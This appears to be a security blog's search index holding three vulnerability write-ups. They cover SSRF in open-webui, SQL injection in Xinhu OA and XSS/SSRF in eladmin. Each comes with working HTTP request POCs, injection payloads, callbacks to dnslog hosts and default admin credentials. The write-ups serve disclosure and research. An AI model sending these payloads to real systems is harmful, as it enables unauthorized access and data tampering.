<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>open-webui_ssrf漏洞</title>
      <link href="/jcxj/2025/03/01/open-webui-ssrf-lou-dong/"/>
      <url>/jcxj/2025/03/01/open-webui-ssrf-lou-dong/</url>
      
        <content type="html"><![CDATA[<h1 id="1-影响版本"><a href="#1-影响版本" class="headerlink" title="1.影响版本"></a>1.影响版本</h1><img src="/jcxj/2025/03/01/open-webui-ssrf-lou-dong/image-20250301144310748.png" class="" title="image-20250301144310748"><p>版本：v0.5.16</p><h1 id="2-攻击步骤"><a href="#2-攻击步骤" class="headerlink" title="2.攻击步骤"></a>2.攻击步骤</h1><p>访问 设置-外部链接-管理Ollama API连接</p><img src="/jcxj/2025/03/01/open-webui-ssrf-lou-dong/image-20250301144356272.png" class="" title="image-20250301144356272"><p>url填入：<a href="http://2223.xdoko0gi.eyes.sh/?id=1&#39;">http://2223.xdoko0gi.eyes.sh/?id=1&#39;</a> or 1=1 – # 后点击右边的测试按钮</p><pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;2223.xdoko0gi.eyes.sh&#x2F;?id&#x3D;1&#39; or 1&#x3D;1 -- #<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="/jcxj/2025/03/01/open-webui-ssrf-lou-dong/image-20250301144933103.png" class="" title="image-20250301144933103"><p>查看dnslog平台的web日志，如下图，成功利用服务器发起了任意形式的GET请求攻击，验证了SSRF攻击存在</p><img src="/jcxj/2025/03/01/open-webui-ssrf-lou-dong/image-20250301144959765.png" class="" title="image-20250301144959765"><p>POC如下</p><pre class="line-numbers language-none"><code class="language-none">POST &#x2F;ollama&#x2F;verify HTTP&#x2F;1.1Host: localhost:8080Content-Length: 66sec-ch-ua: Accept: application&#x2F;jsonContent-Type: application&#x2F;jsonsec-ch-ua-mobile: ?0Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6ImRmM2RmNzE5LWE0NGUtNDVkNC1hZGJkLWRiNWRhNmVjNzg4OSJ9.enDXNwjdUApgnnkE71G8eznz87KTQwRNQ9RKODnaSS4User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;116.0.5845.97 Safari&#x2F;537.36sec-ch-ua-platform: &quot;&quot;Origin: http:&#x2F;&#x2F;localhost:8080Sec-Fetch-Site: same-originSec-Fetch-Mode: corsSec-Fetch-Dest: emptyReferer: http:&#x2F;&#x2F;localhost:8080&#x2F;admin&#x2F;settingsAccept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q&#x3D;0.9Cookie: token&#x3D;eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6ImRmM2RmNzE5LWE0NGUtNDVkNC1hZGJkLWRiNWRhNmVjNzg4OSJ9.enDXNwjdUApgnnkE71G8eznz87KTQwRNQ9RKODnaSS4Connection: close&#123;&quot;url&quot;:&quot;http:&#x2F;&#x2F;2223.xdoko0gi.eyes.sh&#x2F;?id&#x3D;1&#39; or 1&#x3D;1 -- #&quot;,&quot;key&quot;:&quot;&quot;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>为什么要用 # 注释符？</p><p>如下图所示，如果没用#则url会自动拼接上 /api/version, 可能会影响正常攻击payload（如sql注入攻击并不会用到/api/version）</p><img src="/jcxj/2025/03/01/open-webui-ssrf-lou-dong/image-20250301151957826.png" class="" title="image-20250301151957826"><h1 id="3-源码跟踪"><a href="#3-源码跟踪" class="headerlink" title="3.源码跟踪"></a>3.源码跟踪</h1><p>漏洞原理：利用#注释符注释掉了默认添加在url后面的 /api/version,达到了SSRF漏洞</p><p>如POC所示，程序向/ollama/verify发起了POST请求，请求参数为</p><pre class="line-numbers language-none"><code class="language-none">&#123;&quot;url&quot;:&quot;http:&#x2F;&#x2F;2223.xdoko0gi.eyes.sh&#x2F;?id&#x3D;1&#39; or 1&#x3D;1 -- #&quot;,&quot;key&quot;:&quot;&quot;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="/jcxj/2025/03/01/open-webui-ssrf-lou-dong/image-20250301150939879.png" class="" title="image-20250301150939879"><p>根据 /ollama/verify路由可以找到处理该路径的函数</p><img src="/jcxj/2025/03/01/open-webui-ssrf-lou-dong/image-20250301151635154.png" class="" title="image-20250301151635154"><p>该函数位于 /routers/ollama/verify中,如 185、186行所示，该函数会从表单中获取名为url、key的参数值</p><p>在193行，f”{url}/api/version”, 中，将用户输入的url直接拼接上 /api/version (此处可以用 # 进行绕过)</p><pre class="line-numbers language-none"><code class="language-none">async with session.get(                f&quot;&#123;url&#125;&#x2F;api&#x2F;version&quot;,                headers&#x3D;&#123;**(&#123;&quot;Authorization&quot;: f&quot;Bearer &#123;key&#125;&quot;&#125; if key else &#123;&#125;)&#125;,            )<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>最后将拼接好的url和headers发起get请求</p><h1 id="4-修复建议"><a href="#4-修复建议" class="headerlink" title="4.修复建议"></a>4.修复建议</h1><p>在url拼接前，对用户的输入进行严格限制，如不允许输入特殊字符#</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>信呼oa审计</title>
      <link href="/jcxj/2024/12/11/xin-hu-oa-shen-ji/"/>
      <url>/jcxj/2024/12/11/xin-hu-oa-shen-ji/</url>
      
        <content type="html"><![CDATA[<h1 id="0-源码下载"><a href="#0-源码下载" class="headerlink" title="0.源码下载"></a>0.源码下载</h1><p><a href="https://github.com/rainrocka/xinhu.git">https://github.com/rainrocka/xinhu.git</a></p><p>版本：信呼OA的2.6.5版本</p><h1 id="1-客户管理处存在sql注入"><a href="#1-客户管理处存在sql注入" class="headerlink" title="1.客户管理处存在sql注入"></a>1.客户管理处存在sql注入</h1><p>新增客户</p><img src="/jcxj/2024/12/11/xin-hu-oa-shen-ji/image-20241211135947241.png" class="" title="image-20241211135947241"><h2 id="抓包查看路由"><a href="#抓包查看路由" class="headerlink" title="抓包查看路由"></a>抓包查看路由</h2><img src="/jcxj/2024/12/11/xin-hu-oa-shen-ji/image-20241211141944099.png" class="" title="image-20241211141944099"><h2 id="源码定位"><a href="#源码定位" class="headerlink" title="源码定位"></a>源码定位</h2><p>index.php#34 引用了View.php</p><img src="/jcxj/2024/12/11/xin-hu-oa-shen-ji/image-20241211142000159.png" class="" title="image-20241211142000159"><p>View.php中对参数解析，再引用</p><img src="/jcxj/2024/12/11/xin-hu-oa-shen-ji/image-20241211142052217.png" class="" title="image-20241211142052217"><pre class="line-numbers language-none"><code class="language-none">POST &#x2F;index.php?a&#x3D;save&amp;m&#x3D;mode_customer|input&amp;d&#x3D;flow&amp;ajaxbool&#x3D;true&amp;rnd&#x3D;792761<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>变为</p><pre class="line-numbers language-none"><code class="language-none">$m &#x3D; mode_customer$_m&#x3D;input$a&#x3D;save$actname &#x3D; saveAjax<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><img src="/jcxj/2024/12/11/xin-hu-oa-shen-ji/image-20241211142028415.png" class="" title="image-20241211142028415"><p>如上图，最终调用 mode_customerClassAction.saveAjax</p><p>由于mode_customerClassAction没有saveAjax，因此最终调用inputAction.saveAjax</p><img src="/jcxj/2024/12/11/xin-hu-oa-shen-ji/image-20241211142519559.png" class="" title="image-20241211142519559"><img src="/jcxj/2024/12/11/xin-hu-oa-shen-ji/image-20241211142601009.png" class="" title="image-20241211142601009"><p>在241进行数据库保存，为了方便调试，将$uaarr输出进行参数查看</p><img src="/jcxj/2024/12/11/xin-hu-oa-shen-ji/image-20241211143500206.png" class="" title="image-20241211143500206"><h2 id="动态调试"><a href="#动态调试" class="headerlink" title="动态调试"></a>动态调试</h2><p>在新增客户中，随便找个参数，通过添加 \ 进行绕过</p><pre class="line-numbers language-none"><code class="language-none">linkname&#x3D;a3\<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>payload为</p><pre class="line-numbers language-none"><code class="language-none">id&#x3D;0&amp;sxuanfileid&#x3D;&amp;name&#x3D;1234&amp;laiyuan&#x3D;%E7%BD%91%E4%B8%8A%E5%BC%80%E6%8B%93&amp;unitname&#x3D;&amp;type&#x3D;%E4%BA%92%E8%81%94%E7%BD%91&amp;linkname&#x3D;a3\&amp;email&#x3D;&amp;tel&#x3D;22&amp;mobile&#x3D;33&amp;sheng&#x3D;&amp;shi&#x3D;44&amp;address&#x3D;&amp;addresslatlng&#x3D;&amp;shibieid&#x3D;&amp;openbank&#x3D;&amp;cardid&#x3D;&amp;routeline&#x3D;&amp;explain&#x3D;&amp;fileid&#x3D;&amp;status&#x3D;1&amp;isstat&#x3D;0&amp;isgys&#x3D;0&amp;sysmodeid&#x3D;7&amp;sysmodenum&#x3D;customer<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>此时返回包出现报错</p><img src="/jcxj/2024/12/11/xin-hu-oa-shen-ji/image-20241211143612285.png" class="" title="image-20241211143612285"><p>进入日志查看具体的sql语法</p><img src="/jcxj/2024/12/11/xin-hu-oa-shen-ji/image-20241211143635809.png" class="" title="image-20241211143635809"><p>sql语法使用单引号闭合并且没有对 \ 进行处理导致引号错误</p><p>改一下payload</p><pre class="line-numbers language-none"><code class="language-none">linkname&#x3D;a3\explain&#x3D;1%20--%20<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>报错如下图</p><img src="/jcxj/2024/12/11/xin-hu-oa-shen-ji/image-20241211144333907.png" class="" title="image-20241211144333907"><p>将语句复制到sql查询中查看，此时引号闭合且 1 成功逃逸</p><img src="/jcxj/2024/12/11/xin-hu-oa-shen-ji/image-20241211144349374.png" class="" title="image-20241211144349374"><p>将explain中的1删掉</p><img src="/jcxj/2024/12/11/xin-hu-oa-shen-ji/image-20241211144439955.png" class="" title="image-20241211144439955"><p>成功添加用户</p><p>将1改成时间盲注的语句</p><pre class="line-numbers language-none"><code class="language-none">linkname&#x3D;a3\explain&#x3D;;(select(if(1&#x3D;1,(benchmark(10000000,SHA1(&#39;Hello&#39;))),2)&#x3D;1))%20--%20<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>还是报错了</p><img src="/jcxj/2024/12/11/xin-hu-oa-shen-ji/image-20241211145715648.png" class="" title="image-20241211145715648"><p>时间盲注语句在sql查询中能正常执行，但在这里不行。说明可能是分号的问题，将分号去掉改成逗号</p><pre class="line-numbers language-none"><code class="language-none">linkname&#x3D;a3\explain&#x3D;,&#96;explain&#96;&#x3D;(select(if(1&#x3D;1,(benchmark(10000000,SHA1(111))),2)&#x3D;1))%20--%20<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><img src="/jcxj/2024/12/11/xin-hu-oa-shen-ji/image-20241211145739182.png" class="" title="image-20241211145739182"><p>成功盲注</p><h2 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h2><pre class="line-numbers language-none"><code class="language-none">POST &#x2F;index.php?a&#x3D;save&amp;m&#x3D;mode_customer|input&amp;d&#x3D;flow&amp;ajaxbool&#x3D;true&amp;rnd&#x3D;131480 HTTP&#x2F;1.1Host: 127.0.0.1Content-Length: 368sec-ch-ua: &quot;Chromium&quot;;v&#x3D;&quot;119&quot;, &quot;Not?A_Brand&quot;;v&#x3D;&quot;24&quot;Accept: *&#x2F;*Content-Type: application&#x2F;x-www-form-urlencodedX-Requested-With: XMLHttpRequestsec-ch-ua-mobile: ?0User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;119.0.6045.123 Safari&#x2F;537.36sec-ch-ua-platform: &quot;Windows&quot;Origin: http:&#x2F;&#x2F;127.0.0.1Sec-Fetch-Site: same-originSec-Fetch-Mode: corsSec-Fetch-Dest: emptyReferer: http:&#x2F;&#x2F;127.0.0.1&#x2F;?a&#x3D;lu&amp;m&#x3D;input&amp;d&#x3D;flow&amp;num&#x3D;customer&amp;mid&#x3D;0&amp;callback&#x3D;opegs1733901100171_7188Accept-Encoding: gzip, deflate, brAccept-Language: zh-CN,zh;q&#x3D;0.9Cookie: deviceid&#x3D;1733896888157; xinhu_ca_adminuser&#x3D;admin; xinhu_ca_rempass&#x3D;1; PHPSESSID&#x3D;0gjig9u51nhbp8m7cijt12e520; xinhu_mo_adminid&#x3D;dv0cj0xxb0cx0xjx0dm0mu0xxd0vj0xll0mj0xju0md0mx0mw0cd012; xinhu_ca_adminpass&#x3D;lw0lx0li0hhj0wx0lx0ei0hio0xx0hoj0xx0el06Connection: closeid&#x3D;0&amp;sxuanfileid&#x3D;&amp;name&#x3D;11&amp;laiyuan&#x3D;%E7%94%B5%E8%AF%9D%E5%BC%80%E6%8B%93&amp;unitname&#x3D;&amp;type&#x3D;%E4%BA%92%E8%81%94%E7%BD%91&amp;linkname&#x3D;a3\&amp;email&#x3D;&amp;tel&#x3D;&amp;mobile&#x3D;&amp;sheng&#x3D;&amp;shi&#x3D;&amp;address&#x3D;&amp;addresslatlng&#x3D;&amp;shibieid&#x3D;&amp;openbank&#x3D;&amp;cardid&#x3D;&amp;routeline&#x3D;&amp;explain&#x3D;,&#96;explain&#96;&#x3D;(select(if(1&#x3D;1,(benchmark(10000000,SHA1(111))),2)&#x3D;1))%20--%20&amp;fileid&#x3D;&amp;status&#x3D;1&amp;isstat&#x3D;0&amp;isgys&#x3D;0&amp;sysmodeid&#x3D;7&amp;sysmodenum&#x3D;customer<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="补充"><a href="#补充" class="headerlink" title="补充"></a>补充</h1><p>测试过程中发现黑名单，可以直接去源码中搜被过滤的字符串从而找到黑名单;加逗号是因为php数组以逗号隔开元素</p><pre class="line-numbers language-none"><code class="language-none">select被过滤 -&gt; select,<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="/jcxj/2024/12/11/xin-hu-oa-shen-ji/image-20241211150215134.png" class="" title="image-20241211150215134"><img src="/jcxj/2024/12/11/xin-hu-oa-shen-ji/image-20241211150258765.png" class="" title="image-20241211150258765">]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>eladmin-复现</title>
      <link href="/jcxj/2024/09/09/eladmin-fu-xian/"/>
      <url>/jcxj/2024/09/09/eladmin-fu-xian/</url>
      
        <content type="html"><![CDATA[<h1 id="0-github项目地址"><a href="#0-github项目地址" class="headerlink" title="0.github项目地址"></a>0.github项目地址</h1><p><a href="https://github.com/elunez/eladmin">elunez/eladmin: eladmin jpa 版本：项目基于 Spring Boot 2.6.4、 Jpa、 Spring Security、Redis、Vue的前后端分离的后台管理系统，项目采用分模块开发方式， 权限控制采用 RBAC，支持数据字典与数据权限管理，支持一键生成前后端代码，支持动态路由 (github.com)</a></p><h1 id="1-用默认密码登录后台"><a href="#1-用默认密码登录后台" class="headerlink" title="1.用默认密码登录后台"></a>1.用默认密码登录后台</h1><p>admin/123456</p><img src="/jcxj/2024/09/09/eladmin-fu-xian/image-20240909093504969.png" class="" title="image-20240909093504969"><h1 id="CVE-2024-44676"><a href="#CVE-2024-44676" class="headerlink" title="CVE-2024-44676"></a>CVE-2024-44676</h1><p>XSS漏洞</p><h2 id="1-找到文件存储功能"><a href="#1-找到文件存储功能" class="headerlink" title="1.找到文件存储功能"></a>1.找到文件存储功能</h2><p>系统工具 - 存储股那里 - 文件上传</p><img src="/jcxj/2024/09/09/eladmin-fu-xian/image-20240909094917731.png" class="" title="image-20240909094917731"><p>上传文件，数据包如下</p><pre class="line-numbers language-none"><code class="language-none">POST &#x2F;api&#x2F;localStorage?name&#x3D;111 HTTP&#x2F;1.1Host: localhost:8000Content-Length: 204sec-ch-ua: &quot;Chromium&quot;;v&#x3D;&quot;119&quot;, &quot;Not?A_Brand&quot;;v&#x3D;&quot;24&quot;Content-Type: multipart&#x2F;form-data; boundary&#x3D;----WebKitFormBoundarydm6xWQjws9AqeeBjsec-ch-ua-mobile: ?0Authorization: Bearer eyJhbGciOiJIUzUxMiJ9.eyJqdGkiOiJlMjZmYzFiNzQ1M2Q0ZjBlODg4NGRiNjQ3NDZjNmVmNCIsInVzZXIiOiJhZG1pbiIsInN1YiI6ImFkbWluIn0.IX5Benb8JGPsQ_jkpL5jMy3wmfq5YgOakx1tfV1064_QjwcRHAGg0lqDlwcFxRNlnBEvb0xZqCQbWsuGwUWyRQUser-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;119.0.6045.123 Safari&#x2F;537.36sec-ch-ua-platform: &quot;Windows&quot;Accept: *&#x2F;*Origin: http:&#x2F;&#x2F;localhost:8013Sec-Fetch-Site: same-siteSec-Fetch-Mode: corsSec-Fetch-Dest: emptyReferer: http:&#x2F;&#x2F;localhost:8013&#x2F;Accept-Encoding: gzip, deflate, brAccept-Language: zh-CN,zh;q&#x3D;0.9Connection: close------WebKitFormBoundarydm6xWQjws9AqeeBjContent-Disposition: form-data; name&#x3D;&quot;file&quot;; filename&#x3D;&quot;1.html&quot;Content-Type: text&#x2F;html&lt;script&gt;alert(1)&lt;&#x2F;script&gt;------WebKitFormBoundarydm6xWQjws9AqeeBj--<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="2-访问文件地址"><a href="#2-访问文件地址" class="headerlink" title="2.访问文件地址"></a>2.访问文件地址</h2><p>如下图，出现弹窗，证明了存在xss漏洞</p><img src="/jcxj/2024/09/09/eladmin-fu-xian/image-20240909094818168.png" class="" title="image-20240909094818168"><h1 id="CVE-2024-44677"><a href="#CVE-2024-44677" class="headerlink" title="CVE-2024-44677"></a>CVE-2024-44677</h1><p>SSRF漏洞</p><h2 id="1-访问dnslog平台并申请域名"><a href="#1-访问dnslog平台并申请域名" class="headerlink" title="1.访问dnslog平台并申请域名"></a>1.访问dnslog平台并申请域名</h2><img src="/jcxj/2024/09/09/eladmin-fu-xian/image-20240909093611696.png" class="" title="image-20240909093611696"><p>域名为 ae2a2f2773.ipv6.1433.eu.org.</p><h2 id="2-在数据库管理中测试ssrf"><a href="#2-在数据库管理中测试ssrf" class="headerlink" title="2.在数据库管理中测试ssrf"></a>2.在数据库管理中测试ssrf</h2><p>testssrf.ae2a2f2773.ipv6.1433.eu.org.</p><p>漏洞点在 运维管理 - 数据库管理 - 新增数据库 - jdbc地址</p><img src="/jcxj/2024/09/09/eladmin-fu-xian/image-20240909094023940.png" class="" title="image-20240909094023940"><p>数据包为</p><pre class="line-numbers language-none"><code class="language-none">POST &#x2F;api&#x2F;database HTTP&#x2F;1.1Host: localhost:8013Content-Length: 111sec-ch-ua: &quot;Chromium&quot;;v&#x3D;&quot;119&quot;, &quot;Not?A_Brand&quot;;v&#x3D;&quot;24&quot;Accept: application&#x2F;json, text&#x2F;plain, *&#x2F;*Content-Type: application&#x2F;jsonsec-ch-ua-mobile: ?0Authorization: Bearer eyJhbGciOiJIUzUxMiJ9.eyJqdGkiOiJlMjZmYzFiNzQ1M2Q0ZjBlODg4NGRiNjQ3NDZjNmVmNCIsInVzZXIiOiJhZG1pbiIsInN1YiI6ImFkbWluIn0.IX5Benb8JGPsQ_jkpL5jMy3wmfq5YgOakx1tfV1064_QjwcRHAGg0lqDlwcFxRNlnBEvb0xZqCQbWsuGwUWyRQUser-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;119.0.6045.123 Safari&#x2F;537.36sec-ch-ua-platform: &quot;Windows&quot;Origin: http:&#x2F;&#x2F;localhost:8013Sec-Fetch-Site: same-originSec-Fetch-Mode: corsSec-Fetch-Dest: emptyReferer: http:&#x2F;&#x2F;localhost:8013&#x2F;mnt&#x2F;mnt&#x2F;databaseAccept-Encoding: gzip, deflate, brAccept-Language: zh-CN,zh;q&#x3D;0.9Cookie: USER_NAME_COOKIE&#x3D;admin; SID_1&#x3D;6ff9d0e1; ELADMIN-TOEKN&#x3D;Bearer%20eyJhbGciOiJIUzUxMiJ9.eyJqdGkiOiJlMjZmYzFiNzQ1M2Q0ZjBlODg4NGRiNjQ3NDZjNmVmNCIsInVzZXIiOiJhZG1pbiIsInN1YiI6ImFkbWluIn0.IX5Benb8JGPsQ_jkpL5jMy3wmfq5YgOakx1tfV1064_QjwcRHAGg0lqDlwcFxRNlnBEvb0xZqCQbWsuGwUWyRQConnection: close&#123;&quot;id&quot;:null,&quot;name&quot;:&quot;11&quot;,&quot;jdbcUrl&quot;:&quot;jdbc:mysql:&#x2F;&#x2F;testssrf.ae2a2f2773.ipv6.1433.eu.org.&quot;,&quot;userName&quot;:&quot;1&quot;,&quot;pwd&quot;:&quot;1&quot;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>点击确定后能看到右上角提示新增成功</p><img src="/jcxj/2024/09/09/eladmin-fu-xian/image-20240909094257824.png" class="" title="image-20240909094257824"><p>点击 jdbc 地址右侧的测试</p><img src="/jcxj/2024/09/09/eladmin-fu-xian/image-20240909094440434.png" class="" title="image-20240909094440434"><p>数据包为</p><pre class="line-numbers language-none"><code class="language-none">POST &#x2F;api&#x2F;database&#x2F;testConnect HTTP&#x2F;1.1Host: localhost:8013Content-Length: 253sec-ch-ua: &quot;Chromium&quot;;v&#x3D;&quot;119&quot;, &quot;Not?A_Brand&quot;;v&#x3D;&quot;24&quot;Accept: application&#x2F;json, text&#x2F;plain, *&#x2F;*Content-Type: application&#x2F;jsonsec-ch-ua-mobile: ?0Authorization: Bearer eyJhbGciOiJIUzUxMiJ9.eyJqdGkiOiJlMjZmYzFiNzQ1M2Q0ZjBlODg4NGRiNjQ3NDZjNmVmNCIsInVzZXIiOiJhZG1pbiIsInN1YiI6ImFkbWluIn0.IX5Benb8JGPsQ_jkpL5jMy3wmfq5YgOakx1tfV1064_QjwcRHAGg0lqDlwcFxRNlnBEvb0xZqCQbWsuGwUWyRQUser-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;119.0.6045.123 Safari&#x2F;537.36sec-ch-ua-platform: &quot;Windows&quot;Origin: http:&#x2F;&#x2F;localhost:8013Sec-Fetch-Site: same-originSec-Fetch-Mode: corsSec-Fetch-Dest: emptyReferer: http:&#x2F;&#x2F;localhost:8013&#x2F;mnt&#x2F;mnt&#x2F;databaseAccept-Encoding: gzip, deflate, brAccept-Language: zh-CN,zh;q&#x3D;0.9Cookie: USER_NAME_COOKIE&#x3D;admin; SID_1&#x3D;6ff9d0e1; ELADMIN-TOEKN&#x3D;Bearer%20eyJhbGciOiJIUzUxMiJ9.eyJqdGkiOiJlMjZmYzFiNzQ1M2Q0ZjBlODg4NGRiNjQ3NDZjNmVmNCIsInVzZXIiOiJhZG1pbiIsInN1YiI6ImFkbWluIn0.IX5Benb8JGPsQ_jkpL5jMy3wmfq5YgOakx1tfV1064_QjwcRHAGg0lqDlwcFxRNlnBEvb0xZqCQbWsuGwUWyRQConnection: close&#123;&quot;id&quot;:&quot;3e070f45c072498299675b4f290137bd&quot;,&quot;name&quot;:&quot;11&quot;,&quot;jdbcUrl&quot;:&quot;jdbc:mysql:&#x2F;&#x2F;testssrf.ae2a2f2773.ipv6.1433.eu.org.&quot;,&quot;userName&quot;:&quot;aaa&quot;,&quot;pwd&quot;:&quot;111&quot;,&quot;createBy&quot;:&quot;admin&quot;,&quot;createTime&quot;:&quot;2024-09-09 09:42:42&quot;,&quot;updateBy&quot;:&quot;admin&quot;,&quot;updateTime&quot;:&quot;2024-09-09 09:44:21&quot;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>回到dndlog平台，如下图所示，有dns请求解析记录，证明了ssrf漏洞</p><img src="/jcxj/2024/09/09/eladmin-fu-xian/image-20240909094520768.png" class="" title="image-20240909094520768">]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
